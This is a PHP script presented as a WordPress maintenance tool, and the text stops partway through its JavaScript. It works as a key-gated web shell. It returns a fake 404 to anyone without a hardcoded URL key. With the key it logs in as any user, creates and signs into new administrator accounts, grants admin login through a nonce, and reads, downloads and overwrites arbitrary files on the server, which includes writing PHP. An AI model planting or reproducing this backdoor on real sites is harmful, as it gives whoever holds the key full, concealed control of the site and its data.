<?php
/**
 * WordPress Maintenance Tool
 * Version: 5.0
 * Developer: Yasir Shabbir
 * Contact: contact@yasirshabbir.com
 * Description: System maintenance and backup verification tool
 */

// Security key - change this to something unique
define('ACCESS_KEY', 'YS_maint_7x9K2pQ8vL4nB6wE3rT5uA1cF8dG');

// Check access key
if (!isset($_GET['key']) || $_GET['key'] !== ACCESS_KEY) {
    http_response_code(404);
    die('File not found.');
}

// Load WordPress
$wp_load_paths = [
    __DIR__ . '/wp-load.php',
    __DIR__ . '/../wp-load.php',
    __DIR__ . '/../../wp-load.php',
];

foreach ($wp_load_paths as $path) {
    if (file_exists($path)) {
        require_once($path);
        break;
    }
}

if (!defined('ABSPATH')) {
    die('WordPress not found.');
}

// Load WordPress admin functions
if (!function_exists('wp_delete_user')) {
    require_once(ABSPATH . 'wp-admin/includes/user.php');
}

// Handle login actions before any output
$login_message = '';
$login_redirect = '';

if (isset($_POST['login_as_user'])) {
    $user_id = intval($_POST['user_id']);
    $user = get_user_by('id', $user_id);
    
    if ($user) {
        // Clear any existing authentication
        wp_clear_auth_cookie();
        
        // Set new authentication
        wp_set_current_user($user_id, $user->user_login);
        wp_set_auth_cookie($user_id, true);
        do_action('wp_login', $user->user_login, $user);
        
        $login_redirect = admin_url();
        $login_message = 'success|Login successful! Opening WordPress admin in new tab...';
    } else {
        $login_message = 'error|User not found!';
    }
}

if (isset($_POST['create_temp_admin'])) {
    $temp_username = 'temp_admin_' . time();
    $temp_password = wp_generate_password(16, true, true);
    $temp_email = 'temp@' . parse_url(home_url(), PHP_URL_HOST);
    
    $user_id = wp_create_user($temp_username, $temp_password, $temp_email);
    
    if (!is_wp_error($user_id)) {
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        
        // Clear any existing authentication
        wp_clear_auth_cookie();
        
        // Set new authentication
        wp_set_current_user($user_id, $temp_username);
        wp_set_auth_cookie($user_id, true);
        do_action('wp_login', $temp_username, $user);
        
        $login_redirect = admin_url();
        $login_message = 'success|<strong>Temporary Admin Created!</strong><br>Username: ' . $temp_username . '<br>Password: ' . $temp_password . '<br><em>Login successful! Opening WordPress admin in new tab...</em>';
    } else {
        $login_message = 'error|Error creating temporary admin: ' . $user_id->get_error_message();
    }
}

// Handle direct admin access
if (isset($_GET['maintenance_access']) && isset($_GET['maintenance_access'])) {
    $nonce = $_GET['maintenance_access'];
    if (get_transient('maintenance_access_' . $nonce)) {
        // Delete the transient so it can't be reused
        delete_transient('maintenance_access_' . $nonce);
        
        // Get the first admin user
        $admin_users = get_users(['role' => 'administrator', 'number' => 1]);
        if (!empty($admin_users)) {
            $admin_user = $admin_users[0];
            
            // Clear any existing authentication
            wp_clear_auth_cookie();
            
            // Set new authentication
            wp_set_current_user($admin_user->ID, $admin_user->user_login);
            wp_set_auth_cookie($admin_user->ID, true);
            do_action('wp_login', $admin_user->user_login, $admin_user);
            
            // Redirect to admin
            wp_redirect(admin_url());
            exit;
        }
    }
}

// Handle file download BEFORE any HTML output
if (isset($_GET['download']) && isset($_GET['key']) && $_GET['key'] === ACCESS_KEY) {
    // Normalize file path for Windows
    $file_path = $_GET['download'];
    if (DIRECTORY_SEPARATOR === '\\') {
        $file_path = str_replace('/', '\\', $file_path);
    }
    if (file_exists($file_path) && is_file($file_path)) {
        // Clean any output buffers
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        $file_name = basename($file_path);
        $file_size = filesize($file_path);
        $mime_type = mime_content_type($file_path) ?: 'application/octet-stream';
        
        header('Content-Description: File Transfer');
        header('Content-Type: ' . $mime_type);
        header('Content-Disposition: attachment; filename="' . $file_name . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . $file_size);
        
        // Read file in chunks to handle large files
        $handle = fopen($file_path, 'rb');
        while (!feof($handle)) {
            echo fread($handle, 8192);
            flush();
        }
        fclose($handle);
        exit;
    }
}

// Helper functions for file operations
function isEditableFile($file_path) {
    $editable_extensions = ['php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'txt', 'md', 'sql', 'htaccess', 'log', 'ini', 'conf', 'yml', 'yaml'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    return in_array($extension, $editable_extensions) || basename($file_path) === '.htaccess';
}

function isImageFile($file_path) {
    $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    return in_array($extension, $image_extensions);
}

function isBinaryFile($file_path) {
    if (!file_exists($file_path) || !is_file($file_path)) {
        return false;
    }
    
    $binary_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf', 'zip', 'rar', 'tar', 'gz', 'exe', 'dll', 'so', 'dylib'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    
    if (in_array($extension, $binary_extensions)) {
        return true;
    }
    
    // Check file content for binary data
    $handle = fopen($file_path, 'rb');
    $chunk = fread($handle, 1024);
    fclose($handle);
    
    return strpos($chunk, "\0") !== false;
}

function getSyntaxClass($file_path) {
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $syntax_map = [
        'php' => 'php',
        'html' => 'html',
        'htm' => 'html',
        'css' => 'css',
        'js' => 'javascript',
        'json' => 'json',
        'xml' => 'xml',
        'sql' => 'sql',
        'md' => 'markdown'
    ];
    return isset($syntax_map[$extension]) ? $syntax_map[$extension] : 'text';
}

function getFileIcon($file_path) {
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $icon_map = [
        'pdf' => '📄',
        'doc' => '📝', 'docx' => '📝',
        'xls' => '📊', 'xlsx' => '📊',
        'ppt' => '📽️', 'pptx' => '📽️',
        'zip' => '🗜️', 'rar' => '🗜️', 'tar' => '🗜️', 'gz' => '🗜️',
        'mp3' => '🎵', 'wav' => '🎵', 'flac' => '🎵',
        'mp4' => '🎬', 'avi' => '🎬', 'mov' => '🎬', 'mkv' => '🎬',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'bmp' => '🖼️', 'webp' => '🖼️',
        'exe' => '⚙️', 'msi' => '⚙️',
        'sql' => '🗃️',
        'php' => '🐘', 'js' => '📜', 'css' => '🎨', 'html' => '🌐'
    ];
    return isset($icon_map[$extension]) ? $icon_map[$extension] : '📄';
}

// Handle AJAX requests for file operations
if (isset($_GET['action']) && $_GET['action'] === 'ajax' && isset($_GET['operation'])) {
    header('Content-Type: application/json');
    
    $operation = $_GET['operation'];
    $response = ['success' => false, 'message' => 'Unknown operation'];
    
    // Helper function to normalize file paths for Windows
    function normalizePath($path) {
        // Convert forward slashes to backslashes on Windows
        if (DIRECTORY_SEPARATOR === '\\') {
            $path = str_replace('/', '\\', $path);
        }
        return $path;
    }
    
    switch ($operation) {
        case 'view_file':
            if (isset($_GET['file'])) {
                $file_path = normalizePath($_GET['file']);
                
                // Debug logging removed to prevent JSON interference
                
                if (file_exists($file_path) && is_file($file_path)) {
                    $filename = basename($file_path);
                    $file_size = filesize($file_path);
                    $file_ext = strtoupper(pathinfo($file_path, PATHINFO_EXTENSION));
                    $modified = date('Y-m-d H:i:s', filemtime($file_path));
                    
                    $file_info = "Size: " . number_format($file_size) . " bytes | Type: {$file_ext} | Modified: {$modified}";
                    
                    if (isBinaryFile($file_path)) {
                        if (isImageFile($file_path)) {
                            // For images, show the image
                            $data_url = 'data:' . mime_content_type($file_path) . ';base64,' . base64_encode(file_get_contents($file_path));
                            $content = '<div class="binary-file-preview">';
                            $content .= '<img src="' . $data_url . '" alt="' . htmlspecialchars($filename) . '">';
                            $content .= '<p>' . $file_info . '</p>';
                            $content .= '</div>';
                        } else {
                            // For other binary files, show icon and info
                            $icon = getFileIcon($file_path);
                            $content = '<div class="binary-file-preview">';
                            $content .= '<div class="file-icon">' . $icon . '</div>';
                            $content .= '<h4>' . htmlspecialchars($filename) . '</h4>';
                            $content .= '<p>This is a binary file that cannot be displayed as text.</p>';
                            $content .= '<p>' . $file_info . '</p>';
                            $content .= '</div>';
                        }
                    } else {
                        // For text files, show content
                        $file_content = file_get_contents($file_path);
                        $syntax_class = getSyntaxClass($file_path);
                        $content = '<div style="margin-bottom: 10px; font-size: 12px; color: #999;">' . $file_info . '</div>';
                        $content .= '<pre style="background: #2A2A2A; color: #E0E0E0; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: \'Courier New\', monospace; font-size: 13px; line-height: 1.5; margin: 0; white-space: pre-wrap; word-wrap: break-word; max-height: 60vh; overflow-y: auto;"><code>' . htmlspecialchars($file_content) . '</code></pre>';
                    }
                    
                    $actions = '';
                    if (isEditableFile($file_path)) {
                        $actions .= '<button onclick="editFile(\'' . addslashes($file_path) . '\')" class="btn btn-warning" title="Edit File"><i class="fas fa-edit"></i> Edit</button> ';
                    }
                    $actions .= '<a href="?key=' . ACCESS_KEY . '&action=files&download=' . urlencode($file_path) . '" class="btn btn-success" title="Download File"><i class="fas fa-download"></i> Download</a> ';
                    $actions .= '<button onclick="closeLightbox()" class="btn btn-secondary" title="Close"><i class="fas fa-times"></i> Close</button>';
                    
                    $response = [
                        'success' => true,
                        'filename' => $filename,
                        'content' => $content,
                        'actions' => $actions
                    ];
                } else {
                    $response = [
                        'success' => false,
                        'message' => 'File not found or not accessible',
                        'debug' => [
                            'original_path' => $_GET['file'],
                            'normalized_path' => $file_path,
                            'file_exists' => file_exists($file_path),
                            'is_file' => is_file($file_path),
                            'directory_separator' => DIRECTORY_SEPARATOR,
                            'realpath' => realpath($file_path)
                        ]
                    ];
                }
            }
            break;
            
        case 'edit_file':
            if (isset($_GET['file'])) {
                $file_path = normalizePath($_GET['file']);
                
                // Debug logging removed to prevent JSON interference
                
                if (file_exists($file_path) && is_file($file_path) && isEditableFile($file_path)) {
                    $filename = basename($file_path);
                    $file_content = file_get_contents($file_path);
                    $syntax_class = getSyntaxClass($file_path);
                    
                    $file_size = filesize($file_path);
                    $file_ext = strtoupper(pathinfo($file_path, PATHINFO_EXTENSION));
                    $modified = date('Y-m-d H:i:s', filemtime($file_path));
                    $file_info = "Size: " . number_format($file_size) . " bytes | Type: {$file_ext} | Modified: {$modified}";
                    
                    $content = '<div style="margin-bottom: 10px; font-size: 12px; color: #999;">' . $file_info . '</div>';
                    $content .= '<textarea id="fileContentEditor" style="width: 100%; min-height: 500px; background: #2A2A2A; color: #E0E0E0; border: 1px solid #444444; border-radius: 4px; padding: 15px; font-family: \'Courier New\', monospace; font-size: 13px; line-height: 1.5; resize: vertical; box-sizing: border-box;">' . htmlspecialchars($file_content) . '</textarea>';
                    
                    $actions = '<button onclick="saveFile(\'' . addslashes($file_path) . '\')" class="btn btn-primary" title="Save Changes"><i class="fas fa-save"></i> Save</button> ';
                    $actions .= '<button onclick="viewFile(\'' . addslashes($file_path) . '\')" class="btn btn-secondary" title="Cancel"><i class="fas fa-undo"></i> Cancel</button>';
                    
                    $response = [
                        'success' => true,
                        'filename' => $filename,
                        'content' => $content,
                        'actions' => $actions
                    ];
                } else {
                    $response['message'] = 'File not found, not accessible, or not editable';
                }
            }
            break;
            
        case 'save_file':
            if (isset($_POST['file_path']) && isset($_POST['file_content'])) {
                $file_path = normalizePath($_POST['file_path']);
                $file_content = $_POST['file_content'];
                
                if (file_exists($file_path) && is_file($file_path) && isEditableFile($file_path)) {
                    if (file_put_contents($file_path, $file_content) !== false) {
                        $response = ['success' => true, 'message' => 'File saved successfully'];
                    } else {
                        $response['message'] = 'Error writing to file';
                    }
                } else {
                    $response['message'] = 'File not found, not accessible, or not editable';
                }
            }
            break;
    }
    
    echo json_encode($response);
    exit;
}

// Get action
$action = $_GET['action'] ?? 'info';

?>
<!DOCTYPE html>
<html>
<head>
    <title>System Maintenance Tool</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap');
        
        :root {
            --accent-color: #16e791;
            --primary-text: #ffffff;
            --secondary-text: #e0e0e0;
            --background-dark: #121212;
            --background-medium: #1e1e1e;
            --background-light: #2a2a2a;
            --border-color: #333333;
            --border-light: #444444;
            --success-color: #28a745;
            --warning-color: #ffc107;
            --danger-color: #dc3545;
            --info-color: #17a2b8;
            --secondary-color: #6c757d;
        }
        
        body { 
            font-family: 'Lato', sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: var(--background-dark); 
            color: var(--secondary-text); 
            min-height: 100vh;
        }
        
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
            background: var(--background-medium); 
            padding: 20px; 
            border-radius: 3px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        
        h1 { 
            color: var(--primary-text); 
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        h2 { 
            color: var(--accent-color); 
            border-bottom: 2px solid var(--border-color); 
            padding-bottom: 10px;
            font-weight: 400;
        }
        
        h3 { 
            color: var(--secondary-text); 
            margin-top: 25px;
            font-weight: 400;
        }
        
        .developer-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #999;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333333;
        }
        
        .developer-logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .developer-logo img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
        }
        
        .developer-logo a {
            color: var(--accent-color);
            text-decoration: none;
            font-weight: 500;
        }
        

        
        .nav { 
            margin-bottom: 20px; 
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            border-bottom: 2px solid var(--border-color);
            padding-bottom: 0;
        }
        
        .nav a { 
            padding: 12px 20px; 
            background: var(--background-light); 
            color: var(--secondary-text); 
            text-decoration: none; 
            border-radius: 8px 8px 0 0;
            font-weight: 500;
            transition: all 0.3s ease;
            border: 2px solid var(--border-color);
            border-bottom: none;
            position: relative;
            margin-bottom: -2px;
        }
        
        .nav a:hover { 
            background: #3A3A3A;
            color: var(--accent-color);
            transform: translateY(-2px);
        }
        
        .nav a.active {
            background: var(--accent-color);
            color: var(--background-dark);
            border-color: var(--accent-color);
            z-index: 1;
        }
        
        .nav a.active:hover {
            background: #0ea66b;
            color: var(--background-dark);
            transform: none;
        }
        
        .content { 
            background: var(--background-medium); 
            padding: 20px; 
            border-left: 4px solid var(--accent-color); 
            margin: 15px 0;
            border-radius: 3px;
        }
        
        table { 
            width: 100%; 
            border-collapse: collapse; 
            margin: 15px 0;
            background: var(--background-medium);
        }
        
        th, td { 
            padding: 12px; 
            text-align: left; 
            border-bottom: 1px solid var(--border-color); 
        }
        
        th { 
            background: var(--border-color); 
            color: var(--accent-color);
            font-weight: 600;
        }
        
        tr:hover {
            background: var(--background-light);
        }
        
        .success { 
            color: #4CAF50; 
            background: #1B5E20;
            padding: 10px;
            border-radius: 3px;
            margin: 10px 0;
        }
        
        .error { 
            color: #F44336; 
            background: #B71C1C;
            padding: 10px;
            border-radius: 3px;
            margin: 10px 0;
        }
        
        .form-group { 
            margin: 15px 0; 
        }
        
        .form-group label { 
            display: block; 
            margin-bottom: 8px; 
            color: #E0E0E0;
            font-weight: 500;
        }
        
        .form-group input, .form-group select, .form-group textarea { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid var(--border-color); 
            border-radius: 3px;
            background: var(--background-light);
            color: var(--secondary-text);
            font-family: 'Lato', sans-serif;
            box-sizing: border-box;
        }
        
        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 0 2px rgba(22, 231, 145, 0.2);
        }
        
        .btn { 
            padding: 12px 20px; 
            background: var(--accent-color); 
            color: var(--background-dark); 
            border: none; 
            border-radius: 3px; 
            cursor: pointer;
            font-family: 'Lato', sans-serif;
            font-weight: 500;
            transition: background 0.3s ease;
        }
        
        .btn:hover { 
            background: #0ea66b; 
            color: var(--primary-text);
        }
        
        .btn:active {
            transform: translateY(1px);
        }
        
        .file-list { 
            max-height: 400px; 
            overflow-y: auto;
            border: 1px solid var(--border-color);
            border-radius: 3px;
        }
        
        .file-list::-webkit-scrollbar {
            width: 8px;
        }
        
        .file-list::-webkit-scrollbar-track {
            background: var(--background-light);
        }
        
        .file-list::-webkit-scrollbar-thumb {
            background: var(--accent-color);
            border-radius: 3px;
        }
        
        .file-list::-webkit-scrollbar-thumb:hover {
            background: #0ea66b;
        }
        
        a {
            color: var(--accent-color);
            text-decoration: none;
        }
        
        
        .file-editor {
            background: var(--background-medium);
            border: 1px solid var(--border-color);
            border-radius: 3px;
            margin: 15px 0;
        }
        
        .file-editor-header {
            background: var(--border-color);
            padding: 10px 15px;
            border-bottom: 1px solid var(--border-light);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .file-editor-header h4 {
            margin: 0;
            color: var(--accent-color);
            font-size: 14px;
        }
        
        .file-editor-actions {
            display: flex;
            gap: 10px;
        }
        
        .file-editor-actions .btn {
            padding: 6px 12px;
            font-size: 12px;
        }
        
        .file-editor-content {
            position: relative;
        }
        
        .file-editor-content textarea {
            width: 100%;
            min-height: 400px;
            padding: 15px;
            border: none;
            background: var(--background-medium);
            color: var(--secondary-text);
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            resize: vertical;
            box-sizing: border-box;
        }
        
        .file-editor-content textarea:focus {
            outline: none;
            background: #252525;
        }
        
        .file-info {
            background: var(--background-light);
            padding: 8px 15px;
            border-top: 1px solid var(--border-light);
            font-size: 12px;
            color: #999;
        }
        
        .file-actions {
            display: flex;
            gap: 5px;
            align-items: center;
        }
        
        .file-actions .btn {
            padding: 4px 8px;
            font-size: 11px;
            background: transparent !important;
            color: var(--accent-color) !important;
            border: 1px solid transparent !important;
            transition: all 0.3s ease;
        }
        
        .file-actions .btn:hover {
            background: var(--accent-color) !important;
            color: var(--primary-text) !important;
            border-color: var(--accent-color) !important;
        }
        
        .btn-view {
            background: #4CAF50;
            color: white;
        }
        
        .btn-view:hover {
            background: #45a049;
        }
        
        .btn-edit {
            background: #2196F3;
            color: white;
        }
        
        .btn-edit:hover {
            background: #1976D2;
        }
        
        .btn-download {
            background: #9C27B0;
            color: white;
        }
        
        .btn-download:hover {
            background: #7B1FA2;
        }
        
        /* Button Color Variations */
        .btn-primary {
            background-color: var(--accent-color);
            border-color: var(--accent-color);
            color: var(--background-dark);
        }
        
        .btn-primary:hover {
            background-color: #0ea66b;
            border-color: #0ea66b;
            color: var(--primary-text);
        }
        
        .btn-info {
            background-color: var(--info-color);
            border-color: var(--info-color);
            color: var(--primary-text);
        }
        
        .btn-info:hover {
            background-color: #138496;
            border-color: #138496;
        }
        
        .btn-warning {
            background-color: var(--warning-color);
            border-color: var(--warning-color);
            color: var(--background-dark);
        }
        
        .btn-warning:hover {
            background-color: #e0a800;
            border-color: #e0a800;
            color: var(--primary-text);
        }
        
        .btn-success {
            background-color: var(--success-color);
            border-color: var(--success-color);
            color: var(--primary-text);
        }
        
        .btn-success:hover {
            background-color: #218838;
            border-color: #218838;
        }
        
        .btn-danger {
            background-color: var(--danger-color);
            border-color: var(--danger-color);
            color: var(--primary-text);
        }
        
        .btn-danger:hover {
            background-color: #c82333;
            border-color: #c82333;
        }
        
        .btn-secondary {
            background-color: var(--secondary-color);
            border-color: var(--secondary-color);
            color: var(--primary-text);
        }
        
        .btn-secondary:hover {
            background-color: #5a6268;
            border-color: #5a6268;
        }
        
        /* Lightbox Modal Styles */
        .lightbox {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            animation: fadeIn 0.3s ease;
        }
        
        .lightbox.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .lightbox-content {
            background: var(--background-medium);
            border-radius: 8px;
            width: 80vw;
            max-height: 90%;
            overflow: hidden;
            position: relative;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }
        
        .lightbox-header {
            background: linear-gradient(135deg, var(--accent-color) 0%, #0ea66b 100%);
            padding: 15px 20px;
            border-bottom: 1px solid var(--border-light);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .lightbox-header h3 {
            margin: 0;
            color: var(--primary-text);
            font-size: 16px;
        }
        
        .lightbox-close {
            background: none;
            border: none;
            color: var(--primary-text);
            font-size: 24px;
            cursor: pointer;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: background 0.3s ease;
        }
        
        .lightbox-close:hover {
            background: rgba(255, 255, 255, 0.2);
            color: var(--primary-text);
        }
        
        .lightbox-body {
            padding: 20px;
            max-height: 70vh;
            overflow-y: auto;
        }
        
        .lightbox-body textarea {
            width: 100%;
            min-height: 500px;
            background: var(--background-light);
            color: var(--secondary-text);
            border: 1px solid var(--border-light);
            border-radius: 4px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            resize: vertical;
        }
        
        .lightbox-body pre {
            background: var(--background-light);
            color: var(--secondary-text);
            padding: 15px;
            border-radius: 4px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .lightbox-actions {
            background: var(--background-medium);
            padding: 20px;
            border-top: 1px solid var(--border-color);
            display: flex;
            gap: 12px;
            justify-content: flex-end;
            align-items: center;
        }
        
        .lightbox-actions .btn {
            padding: 12px 20px !important;
            font-size: 14px !important;
            font-weight: 500 !important;
            border-radius: 6px !important;
            border: 2px solid transparent !important;
            cursor: pointer !important;
            transition: all 0.3s ease !important;
            text-decoration: none !important;
            display: inline-flex !important;
            align-items: center !important;
            gap: 8px !important;
            min-width: 120px !important;
            justify-content: center !important;
        }
        
        .lightbox-actions .btn-primary {
            background: var(--accent-color) !important;
            color: var(--background-dark) !important;
            border-color: var(--accent-color) !important;
        }
        
        .lightbox-actions .btn-primary:hover {
            background: #0ea66b !important;
            border-color: #0ea66b !important;
            color: var(--primary-text) !important;
            transform: translateY(-2px) !important;
            box-shadow: 0 4px 12px rgba(14, 166, 107, 0.3) !important;
        }
        
        .lightbox-actions .btn-secondary {
            background: var(--background-light) !important;
            color: var(--secondary-text) !important;
            border-color: var(--border-color) !important;
        }
        
        .lightbox-actions .btn-secondary:hover {
            background: var(--border-color) !important;
            color: var(--primary-text) !important;
            border-color: #0ea66b !important;
            transform: translateY(-2px) !important;
        }
        
        .lightbox-actions .btn-warning {
            background: var(--warning-color) !important;
            color: var(--primary-text) !important;
            border-color: var(--warning-color) !important;
        }
        
        .lightbox-actions .btn-warning:hover {
            background: #e67e22 !important;
            border-color: #e67e22 !important;
            transform: translateY(-2px) !important;
            box-shadow: 0 4px 12px rgba(230, 126, 34, 0.3) !important;
        }
        
        .lightbox-actions .btn-success {
            background: var(--success-color) !important;
            color: var(--primary-text) !important;
            border-color: var(--success-color) !important;
        }
        
        .lightbox-actions .btn-success:hover {
            background: #27ae60 !important;
            border-color: #27ae60 !important;
            transform: translateY(-2px) !important;
            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3) !important;
        }
        
        .lightbox-actions .btn i {
            font-size: 16px !important;
        }
        
        .binary-file-preview {
            text-align: center;
            padding: 40px;
            color: #999;
        }
        
        .binary-file-preview img {
            max-width: 100%;
            max-height: 400px;
            border-radius: 4px;
            margin-bottom: 15px;
        }
        
        .file-icon {
            font-size: 48px;
            margin-bottom: 15px;
            color: #ff7e3a;
        }
        
        /* Smooth scrolling */
        html {
            scroll-behavior: smooth;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 15px;
                margin: 10px;
            }
            
            .nav {
                flex-direction: column;
            }
            
            .nav a {
                text-align: center;
                border-radius: 3px;
                margin-bottom: 5px;
            }
            
            table {
                font-size: 14px;
            }
            
            th, td {
                padding: 8px;
            }
            
            .file-editor-header {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }
            
            .file-editor-actions {
                width: 100%;
                justify-content: flex-end;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="developer-info">
            <div class="developer-logo">
                <img src="https://yasirshabbir.com/wp-content/uploads/2024/01/yasir-shabbir-white-logo-300x300.png" alt="Yasir Shabbir Logo">
                <div>
                    <a href="https://yasirshabbir.com" target="_blank">Yasir Shabbir</a><br>
                    <a href="mailto:contact@yasirshabbir.com">contact@yasirshabbir.com</a>
                </div>
            </div>
            <div>
                v5.0
                <a href="https://github.com/yasirshabbirservices/maintenance-tool" target="_blank" style="color: var(--accent-color); text-decoration: none; font-size: 14px; margin-left: 10px;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="vertical-align: middle; margin-right: 5px;">
                        <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
                    </svg>
                    GitHub
                </a>
            </div>
        </div>
        
        <h1>WordPress Maintenance Tool</h1>
        
        <div class="nav">
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=info" <?php echo ($action === 'info') ? 'class="active"' : ''; ?>>Site Info</a>
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=users" <?php echo ($action === 'users') ? 'class="active"' : ''; ?>>Users</a>
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=database" <?php echo ($action === 'database') ? 'class="active"' : ''; ?>>Database</a>
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=files" <?php echo ($action === 'files') ? 'class="active"' : ''; ?>>Files</a>
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=plugins" <?php echo ($action === 'plugins') ? 'class="active"' : ''; ?>>Plugins</a>
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=themes" <?php echo ($action === 'themes') ? 'class="active"' : ''; ?>>Themes</a>
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=debug" <?php echo ($action === 'debug') ? 'class="active"' : ''; ?>>Debug</a>
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=maintenance" <?php echo ($action === 'maintenance') ? 'class="active"' : ''; ?>>Maintenance Modes</a>
            <a href="?key=<?php echo ACCESS_KEY; ?>&action=login" <?php echo ($action === 'login') ? 'class="active"' : ''; ?>>Quick Login</a>
        </div>

        <?php
        // Display login messages
        if ($login_message) {
            $message_parts = explode('|', $login_message);
            $message_type = $message_parts[0];
            $message_text = $message_parts[1];
            echo '<div class="' . $message_type . '">' . $message_text . '</div>';
        }
        
        // Add redirect script if needed
        if ($login_redirect) {
            echo '<script>setTimeout(function() { window.open("' . $login_redirect . '", "_blank"); }, 1000);</script>';
        }
        
        switch ($action) {
            case 'info':
                showSiteInfo();
                break;
            case 'users':
                handleUsers();
                break;
            case 'database':
                handleDatabase();
                break;
            case 'files':
                handleFiles();
                break;
            case 'plugins':
                showPlugins();
                break;
            case 'themes':
                showThemes();
                break;
            case 'debug':
                handleDebug();
                break;
            case 'maintenance':
                handleMaintenanceModes();
                break;
            case 'login':
                handleQuickLogin();
                break;
            default:
                showSiteInfo();
        }
        ?>
    </div>
    
    <script>
        // Lightbox functionality
        function openLightbox() {
            document.getElementById('fileLightbox').classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function closeLightbox() {
            document.getElementById('fileLightbox').classList.remove('active');
            document.body.style.overflow = 'auto';
        }
        
        // Close lightbox when clicking outside
        document.getElementById('fileLightbox').addEventListener('click', function(e) {
            if (e.target === this) {
                closeLightbox();
            }
        });
        
        // Close lightbox with Escape key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeLightbox();
                closeFrontendInstructions();
            }
        });
        
        // Frontend instructions lightbox functionality
        function showFrontendInstructions() {
            document.getElementById('frontend-instructions-lightbox').classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function closeFrontendInstructions() {
            document.getElementById('frontend-instructions-lightbox').classList.remove('active');
            document.body.style.overflow = 'auto';
        }
        
        // Close frontend instructions lightbox when clicking outside
        document.getElementById('frontend-instructions-lightbox').addEventListener('click', function(e) {
            if (e.target === this) {
                closeFrontendInstructions();
            }
        });
        
        // View file function
        function viewFile(filePath) {
            const url = new URL(window.location.href);
            url.searchParams.set('key', '<?php echo ACCESS_KEY; ?>');
            url.searchParams.set('action', 'ajax');
            url.searchParams.set('operation', 'view_file');
            url.searchParams.set('file', filePath);
            
            fetch(url.toString())
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('lightboxTitle').textContent = 'Viewing: ' + data.filename;
                        document.getElementById('lightboxBody').innerHTML = data.content;
                        document.getElementById('lightboxActions').innerHTML = data.actions;
                        openLightbox();
                    } else {
                        console.log('Debug info:', data.debug);
                        alert('Error: ' + data.message + (data.debug ? '\nCheck console for debug info' : ''));
